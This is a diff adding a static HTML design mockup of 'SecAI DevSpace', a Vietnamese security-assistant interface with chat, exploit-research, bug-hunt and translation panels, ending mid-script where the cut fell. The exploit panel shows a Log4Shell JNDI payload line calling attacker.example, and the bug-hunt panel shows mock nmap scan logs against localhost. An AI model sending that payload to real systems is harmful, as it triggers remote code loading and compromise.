@@ -1,0 +1,814 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SecAI DevSpace — Design export</title>
+<style>
+:root {
+  --bg: #0b0f14;
+  --bg-2: #10161f;
+  --panel: #131b26;
+  --panel-2: #0e141d;
+  --border: #1e2a38;
+  --text: #e6edf3;
+  --muted: #8b98a5;
+  --accent: #22d3ee;
+  --accent-2: #34d399;
+  --danger: #f87171;
+  --warn: #fbbf24;
+  --radius: 10px;
+  --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
+  --sans: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+}
+
+* { box-sizing: border-box; }
+html, body { height: 100%; margin: 0; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 14px;
+  line-height: 1.55;
+}
+
+.app { display: grid; grid-template-columns: 232px 1fr; height: 100vh; }
+
+/* ── Sidebar ─────────────────────────────────────────────── */
+.sidebar {
+  background: var(--panel-2);
+  border-right: 1px solid var(--border);
+  display: flex; flex-direction: column; padding: 16px 12px; gap: 4px;
+}
+.brand { display: flex; align-items: center; gap: 10px; padding: 6px 8px 16px; }
+.brand .logo {
+  width: 30px; height: 30px; border-radius: 8px;
+  background: linear-gradient(135deg, var(--accent), var(--accent-2));
+  display: grid; place-items: center; font-weight: 800; color: #04121a;
+}
+.brand h1 { font-size: 15px; margin: 0; letter-spacing: .3px; }
+.brand small { color: var(--muted); font-size: 11px; }
+
+.nav-item {
+  display: flex; align-items: center; gap: 10px; padding: 10px 12px;
+  border-radius: 8px; color: var(--muted); cursor: pointer; border: 1px solid transparent;
+  font-weight: 500; user-select: none;
+}
+.nav-item:hover { background: var(--bg-2); color: var(--text); }
+.nav-item.active { background: var(--panel); color: var(--text); border-color: var(--border); }
+.nav-item .ic { font-size: 16px; width: 18px; text-align: center; }
+.nav-item .sub { color: var(--muted); font-family: var(--mono); font-size: 10px; }
+.sidebar .spacer { flex: 1; }
+.side-foot { color: var(--muted); font-size: 11px; padding: 8px; border-top: 1px solid var(--border); }
+
+/* ── Main ────────────────────────────────────────────────── */
+.main { display: flex; flex-direction: column; min-width: 0; min-height: 0; overflow: hidden; }
+.topbar {
+  height: 56px; border-bottom: 1px solid var(--border); background: var(--bg-2);
+  display: flex; align-items: center; gap: 16px; padding: 0 20px; flex-shrink: 0;
+}
+.topbar .title { font-weight: 600; }
+.topbar .grow { flex: 1; }
+.status { display: flex; align-items: center; gap: 7px; font-size: 12px; color: var(--muted); }
+.dot { width: 8px; height: 8px; border-radius: 50%; background: var(--muted); }
+.dot.ok { background: var(--accent-2); box-shadow: 0 0 8px var(--accent-2); }
+.dot.bad { background: var(--danger); }
+.dot.deg { background: var(--warn); }
+
+.field { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--muted); }
+.field input, .field select, .toggle {
+  background: var(--panel); border: 1px solid var(--border); color: var(--text);
+  border-radius: 7px; padding: 6px 9px; font-size: 12px; font-family: inherit;
+}
+.field input:focus, .field select:focus, textarea:focus { outline: 1px solid var(--accent); }
+
+.toggle { cursor: pointer; display: inline-flex; align-items: center; gap: 6px; user-select: none; }
+.toggle input { accent-color: var(--accent); }
+
+.content { flex: 1; overflow: auto; padding: 20px; min-height: 0; }
+.content-wide {
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+}
+.content-wide .panel { max-width: 1280px; width: 100%; }
+.panel { max-width: 980px; margin: 0 auto; display: flex; flex-direction: column; gap: 14px; height: 100%; }
+
+/* ── Chat ────────────────────────────────────────────────── */
+.chat { display: flex; flex-direction: column; height: 100%; }
+.messages { flex: 1; overflow: auto; display: flex; flex-direction: column; gap: 14px; padding-right: 4px; }
+.msg { display: flex; gap: 12px; }
+.msg .avatar {
+  width: 30px; height: 30px; border-radius: 8px; flex-shrink: 0; display: grid; place-items: center;
+  font-size: 13px; font-weight: 700;
+}
+.msg.user .avatar { background: #1f2b3a; color: var(--accent); }
+.msg.assistant .avatar { background: linear-gradient(135deg, var(--accent), var(--accent-2)); color: #04121a; }
+.msg .bubble { background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius); padding: 12px 14px; min-width: 0; flex: 1; }
+.msg.user .bubble { background: var(--panel-2); }
+.msg .role { font-size: 11px; color: var(--muted); margin-bottom: 4px; }
+.empty { color: var(--muted); text-align: center; margin: auto; padding: 40px; }
+
+/* ── Composer ───────────────────────────────────────────── */
+.composer { display: flex; gap: 10px; align-items: flex-end; margin-top: 12px; }
+textarea {
+  flex: 1; resize: vertical; min-height: 46px; max-height: 220px;
+  background: var(--panel); border: 1px solid var(--border); color: var(--text);
+  border-radius: var(--radius); padding: 12px 14px; font-family: inherit; font-size: 14px;
+}
+.btn {
+  background: var(--accent); color: #04121a; border: none; border-radius: 9px;
+  padding: 11px 18px; font-weight: 700; cursor: pointer; font-size: 14px; white-space: nowrap;
+}
+.btn:hover { filter: brightness(1.08); }
+.btn:disabled { opacity: .5; cursor: not-allowed; }
+.btn.ghost { background: transparent; color: var(--text); border: 1px solid var(--border); }
+.btn.danger { background: var(--danger); color: #1a0606; }
+.btn.sm { padding: 6px 12px; font-size: 12px; }
+
+/* ── Forms (poc/translate) ──────────────────────────────── */
+.card { background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; }
+.card h3 { margin: 0 0 12px; font-size: 14px; }
+.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+label.lbl { display: flex; flex-direction: column; gap: 6px; font-size: 12px; color: var(--muted); }
+label.lbl input, label.lbl select, label.lbl textarea {
+  background: var(--panel-2); border: 1px solid var(--border); color: var(--text);
+  border-radius: 8px; padding: 9px 11px; font-family: inherit; font-size: 13px;
+}
+.row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+.seg { display: inline-flex; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+.seg button { background: var(--panel-2); color: var(--muted); border: none; padding: 7px 14px; cursor: pointer; font-size: 13px; }
+.seg button.on { background: var(--accent); color: #04121a; font-weight: 700; }
+
+/* ── Output / markdown ──────────────────────────────────── */
+.output { background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius); padding: 4px 18px; overflow: auto; }
+.md { word-wrap: break-word; overflow-wrap: anywhere; }
+.md h1, .md h2, .md h3 { border-bottom: 1px solid var(--border); padding-bottom: 6px; margin-top: 20px; }
+.md h2 { font-size: 18px; color: var(--accent); }
+.md h3 { font-size: 15px; }
+.md code { font-family: var(--mono); font-size: 12.5px; background: #0a0e14; padding: 1px 5px; border-radius: 4px; }
+.md pre { background: #0a0e14 !important; border: 1px solid var(--border); border-radius: 8px; padding: 12px !important; overflow-x: auto; }
+.md pre code { background: transparent; padding: 0; }
+.md a { color: var(--accent); }
+
+/* PoC / code fence → file card (thu gọn mặc định) */
+.md-files { display: flex; flex-direction: column; gap: 8px; }
+.file-card {
+  position: relative;
+  background: #0a0e14;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+}
+.file-card-head {
+  width: 100%;
+  display: flex; align-items: center; gap: 8px;
+  padding: 8px 12px; padding-right: 72px;
+  background: var(--panel-2); border: none; color: var(--text);
+  cursor: pointer; text-align: left; font-family: inherit; font-size: 12.5px;
+}
+.file-card-head:hover { background: #152032; }
+.file-card-chevron { color: var(--muted); width: 12px; flex-shrink: 0; }
+.file-card-icon { flex-shrink: 0; font-size: 13px; }
+.file-card-title { display: flex; flex-direction: column; gap: 1px; min-width: 0; flex: 1; }
+.file-card-name { font-family: var(--mono); font-weight: 600; color: var(--accent); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.file-card-path { font-family: var(--mono); font-size: 11px; color: var(--muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.file-card-meta { display: flex; align-items: center; gap: 8px; color: var(--muted); font-size: 11px; flex-shrink: 0; }
+.file-card-lang { font-family: var(--mono); text-transform: lowercase; opacity: .85; }
+.file-card-trunc { color: var(--warn); }
+.file-card-actions {
+  position: absolute; top: 6px; right: 8px;
+  display: flex; gap: 4px;
+}
+.file-card-body {
+  margin: 0 !important; border: none !important; border-top: 1px solid var(--border) !important;
+  border-radius: 0 !important; max-height: 420px; overflow: auto;
+  padding: 12px !important;
+}
+.file-card-body code { font-family: var(--mono); font-size: 12px; white-space: pre; }
+.md table { border-collapse: collapse; width: 100%; margin: 12px 0; display: block; overflow-x: auto; }
+.md th, .md td { border: 1px solid var(--border); padding: 6px 10px; }
+.md blockquote { border-left: 3px solid var(--accent); margin: 10px 0; padding: 2px 14px; color: var(--muted); }
+
+/* ── Tool activity + meta ──────────────────────────────── */
+.tools { display: flex; flex-direction: column; gap: 6px; margin-bottom: 8px; }
+.tool {
+  font-family: var(--mono); font-size: 12px; background: var(--panel-2);
+  border: 1px solid var(--border); border-radius: 7px; padding: 6px 10px; color: var(--muted);
+}
+.tool.err { border-color: var(--danger); color: var(--danger); }
+.tool b { color: var(--accent); }
+
+.meta { display: flex; flex-wrap: wrap; gap: 8px; }
+.badge {
+  font-size: 11px; font-family: var(--mono); padding: 3px 9px; border-radius: 20px;
+  border: 1px solid var(--border); background: var(--panel-2); color: var(--muted);
+}
+.badge.ok { color: var(--accent-2); border-color: var(--accent-2); }
+.badge.warn { color: var(--warn); border-color: var(--warn); }
+.meta-block { font-size: 12px; color: var(--muted); }
+.meta-block details { margin-top: 6px; }
+.meta-block summary { cursor: pointer; color: var(--accent); }
+.meta-block pre { background: var(--panel-2); border: 1px solid var(--border); border-radius: 8px; padding: 10px; overflow-x: auto; font-size: 11px; }
+
+/* Mục 1 PoC — panel file riêng (tách khỏi markdown hướng dẫn) */
+.poc-files {
+  display: flex; flex-direction: column; gap: 6px;
+  margin-bottom: 12px; padding: 10px 12px;
+  border: 1px solid var(--border); border-radius: 8px;
+  background: rgba(34, 211, 238, 0.04);
+}
+.poc-files-label {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
+  font-size: 11px; color: var(--accent); margin-bottom: 4px;
+  text-transform: uppercase; letter-spacing: .04em; font-weight: 600;
+}
+.poc-files-count, .poc-files-preview {
+  text-transform: none; letter-spacing: 0; font-weight: 500; color: var(--muted);
+}
+.poc-empty { color: var(--muted); font-size: 13px; padding: 4px 0; }
+.tree-card .file-card-name { color: var(--text); }
+.tree-body { max-height: 200px !important; }
+
+.rewrite-banner {
+  display: flex; align-items: center; gap: 8px;
+  font-size: 12px; color: var(--warn);
+  background: rgba(251, 191, 36, 0.08);
+  border: 1px dashed var(--warn); border-radius: 8px;
+  padding: 8px 12px; margin-bottom: 10px;
+}
+
+.error-box { background: rgba(248,113,113,.1); border: 1px solid var(--danger); color: var(--danger); border-radius: 8px; padding: 10px 14px; font-size: 13px; }
+.hint { color: var(--muted); font-size: 12px; }
+.muted { color: var(--muted); }
+.spin { display: inline-block; width: 12px; height: 12px; border: 2px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: spin .7s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ── Bug Hunt ───────────────────────────────────────────── */
+.bughunt {
+  gap: 12px;
+  min-height: 0;
+  max-height: 100%;
+  overflow: hidden;
+}
+.bughunt > .error-box { flex-shrink: 0; }
+.bh-form { flex-shrink: 0; }
+.bh-hint { margin: -4px 0 14px; color: var(--muted); font-size: 12.5px; }
+.bh-actions { display: flex; align-items: center; gap: 10px; margin-top: 14px; flex-wrap: wrap; }
+.bh-runid { font-family: var(--mono); font-size: 11px; color: var(--muted); margin-left: auto; }
+.bh-phases { display: flex; gap: 8px; margin-top: 14px; flex-wrap: wrap; }
+.bh-phase {
+  font-family: var(--mono); font-size: 11px; padding: 5px 12px; border-radius: 999px;
+  border: 1px solid var(--border); color: var(--muted); background: var(--panel-2);
+}
+.bh-phase.active {
+  color: #04121a; background: var(--accent); border-color: var(--accent);
+  box-shadow: 0 0 12px rgba(34, 211, 238, .35);
+}
+.bh-phase.done { color: var(--accent-2); border-color: rgba(52, 211, 153, .45); }
+
+.bh-split {
+  display: grid;
+  grid-template-columns: 1.4fr 1fr;
+  gap: 14px;
+  flex: 1;
+  min-height: 0;
+  overflow: hidden;
+}
+.bh-term {
+  display: flex;
+  flex-direction: column;
+  padding: 0;
+  overflow: hidden;
+  min-height: 0;
+  height: 100%;
+}
+.bh-term-bar {
+  display: flex; align-items: center; gap: 7px; padding: 10px 14px;
+  border-bottom: 1px solid var(--border); background: #0a1018;
+  flex-shrink: 0;
+}
+.bh-term-dot { width: 9px; height: 9px; border-radius: 50%; background: #334155; }
+.bh-term-dot:nth-child(1) { background: #f87171; }
+.bh-term-dot:nth-child(2) { background: #fbbf24; }
+.bh-term-dot:nth-child(3) { background: #34d399; }
+.bh-term-title {
+  margin-left: 8px; font-family: var(--mono); font-size: 11px; color: var(--muted); flex: 1;
+}
+.bh-term-body {
+  flex: 1;
+  min-height: 0;
+  overflow-y: auto;
+  overflow-x: hidden;
+  padding: 12px 14px;
+  background: #070b10;
+  font-family: var(--mono);
+  font-size: 12px;
+  line-height: 1.55;
+}
+.bh-term-empty { color: var(--muted); padding: 24px 8px; text-align: center; }
+.bh-line { display: grid; grid-template-columns: 96px 1fr; gap: 10px; margin-bottom: 3px; }
+.bh-ts { color: #475569; user-select: none; }
+.bh-txt { color: #cbd5e1; white-space: pre-wrap; word-break: break-word; }
+.kind-phase .bh-txt { color: var(--accent); font-weight: 600; }
+.kind-tool .bh-txt { color: #a5b4fc; }
+.kind-result .bh-txt { color: #86efac; }
+.kind-ok .bh-txt { color: var(--accent-2); }
+.kind-err .bh-txt { color: var(--danger); }
+.kind-token .bh-txt { color: #94a3b8; font-style: italic; }
+.kind-sys .bh-txt { color: #64748b; }
+
+.bh-side {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  min-width: 0;
+  min-height: 0;
+  height: 100%;
+  overflow-y: auto;
+  overflow-x: hidden;
+  padding-right: 2px;
+}
+.bh-side > .card { flex-shrink: 0; }
+.bh-counts { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
+.bh-count {
+  display: flex; justify-content: space-between; gap: 8px;
+  font-family: var(--mono); font-size: 11px; padding: 6px 8px;
+  background: var(--panel-2); border-radius: 7px; border: 1px solid var(--border);
+  color: var(--muted);
+}
+.bh-count b { color: var(--text); }
+.bh-list { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 10px; }
+.bh-list li { display: flex; gap: 10px; align-items: flex-start; }
+.bh-list b { color: var(--text); font-size: 13px; }
+.bh-list code { font-family: var(--mono); font-size: 11px; color: var(--accent); }
+.bh-ev { color: var(--muted); font-size: 12px; margin-top: 2px; }
+.bh-conf { font-family: var(--mono); font-size: 11px; color: var(--accent-2); }
+.sev {
+  flex-shrink: 0; font-family: var(--mono); font-size: 10px; text-transform: uppercase;
+  padding: 3px 7px; border-radius: 6px; border: 1px solid var(--border); color: var(--muted);
+  margin-top: 2px;
+}
+.sev-low, .sev-info { color: var(--accent); border-color: rgba(34,211,238,.35); }
+.sev-medium, .sev-warn { color: var(--warn); border-color: rgba(251,191,36,.4); }
+.sev-high, .sev-critical { color: var(--danger); border-color: rgba(248,113,113,.45); }
+.bh-summary {
+  margin: 0; white-space: pre-wrap; word-break: break-word;
+  font-family: var(--mono); font-size: 11.5px; color: var(--muted); line-height: 1.5;
+  max-height: 160px; overflow-y: auto;
+}
+.bh-report-card { min-height: 120px; }
+.bh-report-head {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 8px;
+  margin-bottom: 8px;
+}
+.bh-report-head h3 { margin: 0; }
+.bh-report-path {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--muted);
+  margin-bottom: 8px;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+.bh-report-md {
+  margin: 0;
+  white-space: pre-wrap;
+  word-break: break-word;
+  font-family: var(--mono);
+  font-size: 11.5px;
+  line-height: 1.45;
+  color: #cbd5e1;
+  max-height: 420px;
+  overflow: auto;
+  padding: 10px;
+  background: #0b1220;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+}
+
+/* Panels are toggled via [hidden] in this static export */
+[hidden] { display: none !important; }
+
+@media (max-width: 820px) {
+  .app { grid-template-columns: 1fr; }
+  .sidebar { display: none; }
+  .grid2 { grid-template-columns: 1fr; }
+  .bh-split { grid-template-columns: 1fr; }
+  .content-wide { overflow: auto; }
+  .bughunt { max-height: none; height: auto; overflow: visible; }
+  .bh-term { min-height: 320px; height: 50vh; }
+}
+</style>
+</head>
+<body>
+<div class="app">
+  <!-- ── Sidebar ─────────────────────────────────────────── -->
+  <aside class="sidebar">
+    <div class="brand">
+      <div class="logo">S</div>
+      <div>
+        <h1>SecAI</h1>
+        <small>DevSpace</small>
+      </div>
+    </div>
+
+    <div class="nav-item active" data-tab="chat">
+      <span class="ic">💬</span>
+      <div><div>Chatbot</div><small class="sub">/ai/chat</small></div>
+    </div>
+    <div class="nav-item" data-tab="poc">
+      <span class="ic">🛡️</span>
+      <div><div>PoC / Khai thác</div><small class="sub">/ai/exploit</small></div>
+    </div>
+    <div class="nav-item" data-tab="bughunt">
+      <span class="ic">🎯</span>
+      <div><div>Bug Hunt</div><small class="sub">/ai/bughunt</small></div>
+    </div>
+    <div class="nav-item" data-tab="translate">
+      <span class="ic">🌐</span>
+      <div><div>Dịch</div><small class="sub">/ai/translate</small></div>
+    </div>
+
+    <div class="spacer"></div>
+    <div class="side-foot">
+      Agent Gateway · IAS v1<br />
+      chat · exploit · bughunt · translate
+    </div>
+  </aside>
+
+  <!-- ── Main ────────────────────────────────────────────── -->
+  <div class="main">
+    <div class="topbar">
+      <div class="title" id="topTitle">Chatbot</div>
+      <div class="grow"></div>
+      <label class="toggle" title="Bật/tắt streaming (SSE)">
+        <input type="checkbox" checked /> Streaming
+      </label>
+      <div class="field" id="fieldUser">
+        user_id
+        <input value="devspace" style="width:120px" />
+      </div>
+      <div class="status" title="gateway health detail">
+        <span class="dot ok"></span> Gateway online
+      </div>
+    </div>
+
+    <!-- ══ CHAT ══════════════════════════════════════════ -->
+    <div class="content" data-panel="chat">
+      <div class="chat panel">
+        <div class="messages">
+          <div class="msg user">
+            <div class="avatar">U</div>
+            <div class="bubble">
+              <div class="role">Bạn</div>
+              <div class="md"><p>SQL injection ở form login PHP thì phòng chống thế nào?</p></div>
+            </div>
+          </div>
+
+          <div class="msg assistant">
+            <div class="avatar">AI</div>
+            <div class="bubble">
+              <div class="role">SecAI</div>
+              <div class="tools">
+                <div class="tool"><b>qdrant_search</b> · owasp sqli · ✓ 214ms</div>
+                <div class="tool"><b>cve_lookup</b> · php pdo · ✓ 98ms</div>
+              </div>
+              <div class="md">
+                <p>Có ba lớp phòng thủ chính:</p>
+                <ol>
+                  <li><strong>Prepared statements</strong> — tách dữ liệu khỏi câu lệnh SQL.</li>
+                  <li><strong>Least privilege</strong> — tài khoản DB chỉ có quyền tối thiểu.</li>
+                  <li><strong>Input validation</strong> — allow-list cho định dạng đầu vào.</li>
+                </ol>
+                <pre><code>$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE email = ?');
+$stmt-&gt;execute([$email]);</code></pre>
+                <blockquote>Không bao giờ nối chuỗi biến người dùng trực tiếp vào SQL.</blockquote>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="composer">
+          <textarea placeholder="Nhập câu hỏi…" rows="1">Có công cụ nào tự dò lỗ hổng này không?</textarea>
+          <button class="btn">Gửi</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ POC / EXPLOIT ═════════════════════════════════ -->
+    <div class="content" data-panel="poc" hidden>
+      <div class="panel">
+        <div class="card">
+          <p class="muted">Exploit research — tìm / fetch PoC (không bịa mã). Streaming khuyến nghị.</p>
+          <textarea rows="4">Phân tích CVE-2021-44228 (Log4Shell) và PoC công khai…</textarea>
+          <div class="row" style="margin-top:10px">
+            <button class="btn">Chạy</button>
+          </div>
+
+          <div class="tools">
+            <div class="tool"><b>poc_search</b> · log4shell · ✓ 320ms</div>
+            <div class="tool"><b>poc_fetch</b> · github raw · ✓ 501ms</div>
+          </div>
+
+          <div style="margin-top:12px">
+            <div class="role">Mục 1 (PoC)</div>
+            <div class="md">
+              <div class="poc-files">
+                <div class="poc-files-label">
+                  PoC files
+                  <span class="poc-files-count">2 file</span>
+                  <span class="poc-files-preview">· từ github.com/…/log4shell-poc</span>
+                </div>
+                <div class="md-files">
+                  <div class="file-card">
+                    <button class="file-card-head">
+                      <span class="file-card-chevron">▸</span>
+                      <span class="file-card-icon">📄</span>
+                      <span class="file-card-title">
+                        <span class="file-card-name">Exploit.java</span>
+                        <span class="file-card-path">poc/src/Exploit.java</span>
+                      </span>
+                      <span class="file-card-meta"><span class="file-card-lang">java</span></span>
+                    </button>
+                  </div>
+                  <div class="file-card">
+                    <button class="file-card-head">
+                      <span class="file-card-chevron">▾</span>
+                      <span class="file-card-icon">📄</span>
+                      <span class="file-card-title">
+                        <span class="file-card-name">payload.txt</span>
+                        <span class="file-card-path">poc/payload.txt</span>
+                      </span>
+                      <span class="file-card-meta"><span class="file-card-lang">text</span></span>
+                    </button>
+                    <pre class="file-card-body"><code>${jndi:ldap://attacker.example/a}</code></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div style="margin-top:12px">
+            <div class="md">
+              <h2>Phân tích</h2>
+              <p>Log4Shell (CVE-2021-44228) khai thác tính năng JNDI lookup trong Log4j 2. Khi
+                một chuỗi <code>${jndi:ldap://…}</code> được ghi log, Log4j sẽ truy vấn máy chủ
+                LDAP do kẻ tấn công kiểm soát và tải về class Java độc hại.</p>
+              <h3>Điều kiện</h3>
+              <ul>
+                <li>Log4j 2.0-beta9 → 2.14.1</li>
+                <li>Đầu vào người dùng đi vào log message</li>
+              </ul>
+              <p>Tham khảo: <a href="#">NVD · CVE-2021-44228</a></p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ BUG HUNT ══════════════════════════════════════ -->
+    <div class="content content-wide" data-panel="bughunt" hidden>
+      <div class="bughunt panel">
+        <div class="card bh-form">
+          <h3>Scan-first bughunt</h3>
+          <p class="bh-hint">
+            Target only — AgentHunt → Validate (triage) → MapCVE → Report → Exploit (opt-in).
+            Không nhập CVE thủ công; CVE chỉ từ scanner evidence.
+          </p>
+          <div class="grid2">
+            <label class="lbl">
+              Target
+              <input value="127.0.0.1:8765" placeholder="host:port hoặc domain" />
+            </label>
+            <label class="lbl">
+              Scope note
+              <input value="local demo" placeholder="optional" />
+            </label>
+          </div>
+          <label class="lbl bh-check" style="margin-top:8px;display:flex;gap:8px;align-items:center">
+            <input type="checkbox" />
+            Enable Exploit phase (cần POC_EXPLOIT_ENABLED + CVE evidence)
+          </label>
+          <div class="bh-actions">
+            <button class="btn">Bắt đầu hunt</button>
+            <button class="btn ghost sm">Xóa log</button>
+            <span class="bh-runid">run_id: 20260811-4f2a</span>
+          </div>
+          <div class="bh-phases">
+            <span class="bh-phase done">AgentHunt</span>
+            <span class="bh-phase done">Validate</span>
+            <span class="bh-phase active">MapCVE</span>
+            <span class="bh-phase">Report</span>
+            <span class="bh-phase">Exploit</span>
+          </div>
+        </div>
+
+        <div class="bh-split">
+          <div class="bh-term card">
+            <div class="bh-term-bar">
+              <span class="bh-term-dot"></span>
+              <span class="bh-term-dot"></span>
+              <span class="bh-term-dot"></span>
+              <span class="bh-term-title">bughunt · SSE console</span>
+              <span class="spin"></span>
+            </div>
+            <div class="bh-term-body">
+              <div class="bh-line kind-sys"><span class="bh-ts">14:22:01.004</span><span class="bh-txt">bughunt start target=127.0.0.1:8765</span></div>
+              <div class="bh-line kind-sys"><span class="bh-ts">14:22:01.009</span><span class="bh-txt">scope: local demo</span></div>
+              <div class="bh-line kind-phase"><span class="bh-ts">14:22:01.512</span><span class="bh-txt">▶ phase AgentHunt</span></div>
+              <div class="bh-line kind-sys"><span class="bh-ts">14:22:01.700</span><span class="bh-txt">⋯ start recon-engine [scanner]</span></div>
+              <div class="bh-line kind-tool"><span class="bh-ts">14:22:02.130</span><span class="bh-txt">$ nmap · -sV 127.0.0.1:8765</span></div>
+              <div class="bh-line kind-result"><span class="bh-ts">14:22:06.480</span><span class="bh-txt">✓ nmap 4350ms</span></div>
+              <div class="bh-line kind-info"><span class="bh-ts">14:22:06.481</span><span class="bh-txt">  ← 1 open port · http (Werkzeug/2.0.1 Python/3.9)</span></div>
+              <div class="bh-line kind-info"><span class="bh-ts">14:22:06.900</span><span class="bh-txt">live hosts: 127.0.0.1</span></div>
+              <div class="bh-line kind-phase"><span class="bh-ts">14:22:07.010</span><span class="bh-txt">▶ phase Validate</span></div>
+              <div class="bh-line kind-token"><span class="bh-ts">14:22:08.220</span><span class="bh-txt">phân tích endpoint /api/exploit không yêu cầu xác thực…</span></div>
+              <div class="bh-line kind-ok"><span class="bh-ts">14:22:09.640</span><span class="bh-txt">✓ validate-leads — 2 leads validated</span></div>
+              <div class="bh-line kind-phase"><span class="bh-ts">14:22:09.900</span><span class="bh-txt">▶ phase MapCVE</span></div>
+              <div class="bh-line kind-tool"><span class="bh-ts">14:22:10.110</span><span class="bh-txt">$ cve_kb_hybrid · werkzeug 2.0.1</span></div>
+            </div>
+          </div>
+
+          <div class="bh-side">
+            <div class="card">
+              <h3>Engine counts</h3>
+              <div class="bh-counts">
+                <div class="bh-count"><span>ports</span><b>1</b></div>
+                <div class="bh-count"><span>endpoints</span><b>12</b></div>
+                <div class="bh-count"><span>findings</span><b>3</b></div>
+                <div class="bh-count"><span>leads</span><b>2</b></div>
+              </div>
+            </div>
+
+            <div class="card">
+              <h3>Findings (3)</h3>
+              <ul class="bh-list">
+                <li>
+                  <span class="sev sev-high">high</span>
+                  <div>
+                    <b>Unauthenticated exploit endpoint</b>
+                    <code> /api/exploit</code>
+                    <div class="bh-ev">POST cho phép chạy exploit không cần token.</div>
+                  </div>
+                </li>
+                <li>
+                  <span class="sev sev-medium">medium</span>
+                  <div>
+                    <b>Verbose server banner</b>
+                    <code> Werkzeug/2.0.1</code>
+                    <div class="bh-ev">Lộ phiên bản framework qua header Server.</div>
+                  </div>
+                </li>
+                <li>
+                  <span class="sev sev-info">info</span>
+                  <div>
+                    <b>Debug mode heuristic</b>
+                    <div class="bh-ev">Trang lỗi trả traceback dạng Werkzeug debugger.</div>
+                  </div>
+                </li>
+              </ul>
+            </div>
+
+            <div class="card">
+              <h3>
+                Leads / hypotheses (2)
+                <span class="bh-conf"> · validated 2</span>
+              </h3>
+              <ul class="bh-list">
+                <li>
+                  <span class="sev sev-info">scanner</span>
+                  <div>
+                    <b>Broken access control</b>
+                    <span class="bh-conf"> 82%</span>
+                    <div class="bh-ev">/api/exploit thiếu kiểm tra phân quyền.</div>
+                  </div>
+                </li>
+                <li>
+                  <span class="sev sev-info">kb</span>
+                  <div>
+                    <b>Werkzeug debugger RCE</b>
+                    <span class="bh-conf"> 61%</span>
+                    <code> CVE-2019-14806</code>
+                    <div class="bh-ev">Console PIN có thể bị brute nếu debug bật.</div>
+                  </div>
+                </li>
+              </ul>
+            </div>
+
+            <div class="card bh-report-card">
+              <div class="bh-report-head">
+                <h3>Report <span class="bh-conf"> · 2 leads, 1 CVEs</span></h3>
+                <button type="button" class="btn ghost sm">Tải .md</button>
+              </div>
+              <div class="bh-report-path" title="/runs/20260811-4f2a/report.md">/runs/20260811-4f2a/report.md</div>
+              <pre class="bh-report-md"># Bughunt Report — 127.0.0.1:8765
+
+## Summary
+2 validated leads, 1 mapped CVE.
+
+## Findings
+- [HIGH] Unauthenticated exploit endpoint (/api/exploit)
+- [MED]  Verbose server banner (Werkzeug/2.0.1)
+
+## Mapped CVEs
+- CVE-2019-14806 — Werkzeug debugger PIN weakness</pre>
+            </div>
+
+            <div class="card">
+              <h3>Summary</h3>
+              <pre class="bh-summary">status=completed llm_hunt=true
+2 leads → 1 CVE mapped.
+Exploit phase skipped (opt-in disabled).</pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ TRANSLATE ═════════════════════════════════════ -->
+    <div class="content" data-panel="translate" hidden>
+      <div class="panel">
+        <div class="card">
+          <div class="row" style="margin-bottom:12px">
+            <label class="lbl" style="flex:1">
+              Nguồn
+              <select>
+                <option>Tự nhận diện</option>
+                <option>Tiếng Việt</option>
+                <option>English</option>
+                <option>中文</option>
+                <option>日本語</option>
+              </select>
+            </label>
+            <button class="btn ghost sm" style="align-self:flex-end" title="Đảo chiều">⇄</button>
+            <label class="lbl" style="flex:1">
+              Đích
+              <select>
+                <option>English</option>
+                <option>Tiếng Việt</option>
+                <option>中文</option>
+                <option>日本語</option>
+              </select>
+            </label>
+          </div>
+          <div class="grid2">
+            <label class="lbl">
+              Văn bản gốc
+              <textarea rows="10" placeholder="Nhập văn bản cần dịch…">Lỗ hổng cho phép kẻ tấn công thực thi mã từ xa mà không cần xác thực.</textarea>
+            </label>
+            <label class="lbl">
+              Kết quả
+              <div class="output" style="min-height:200px;padding:10px 14px">
+                <div class="md"><p>The vulnerability allows an attacker to execute code remotely without authentication.</p></div>
+              </div>
+            </label>
+          </div>
+          <div class="row" style="margin-top:12px">
+            <button class="btn">Dịch</button>
+            <button class="btn ghost">Copy</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // Static tab switching for design preview only.
+  const titles = { chat: "Chatbot", poc: "PoC / Khai thác", bughunt: "Bug Hunt", translate: "Dịch" };
+  const navItems = document.querySelectorAll(".nav-item");
+  const panels = document.querySelectorAll("[data-panel]");
+  const fieldUser = document.getElementById("fieldUser");
